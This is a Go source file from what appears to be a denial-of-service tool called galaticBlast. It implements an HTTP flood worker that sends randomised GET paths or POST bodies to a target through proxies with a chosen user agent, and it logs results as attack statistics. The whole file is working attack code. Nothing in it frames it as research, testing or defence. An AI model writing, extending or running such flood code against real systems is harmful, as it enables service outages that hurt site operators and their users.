package http

import (
	"context"
	"math/rand"
	"net/http"
	"strings"
	"time"

	"github.com/galaticBlast/galaticBlast/internal/engine"
	"github.com/galaticBlast/galaticBlast/internal/netutil"
)

type FloodWorker struct{}

func NewFloodWorker() *FloodWorker {
	return &FloodWorker{}
}

func (w *FloodWorker) Fire(ctx context.Context, params engine.AttackParams, proxy engine.Proxy, userAgent string, logCh chan<- engine.AttackStats) error {
	client := netutil.DialedHTTPClient(proxy, 10*time.Second, 0)

	var method string
	if params.PacketSize <= 512 {
		if rand.Intn(2) == 0 {
			method = "GET"
		} else {
			method = "POST"
		}
	} else {
		method = "POST"
	}

	var req *http.Request
	var err error

	targetURL := params.TargetNode.ToURL()

	if method == "GET" {
		randomPath := generateRandomString(params.PacketSize)
		req, err = http.NewRequestWithContext(ctx, "GET", targetURL+"/"+randomPath, nil)
	} else {
		body := generateRandomString(params.PacketSize)
		req, err = http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(body))
	}

	if err != nil {
		return err
	}

	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Connection", "keep-alive")

	resp, err := client.Do(req)
	if err != nil {
		engine.SendAttackLogIfVerbose(params.Verbose, logCh, "request failed: "+err.Error())
		return nil
	}
	resp.Body.Close()

	engine.SendAttackLogIfVerbose(params.Verbose, logCh, "request sent successfully")
	return nil
}
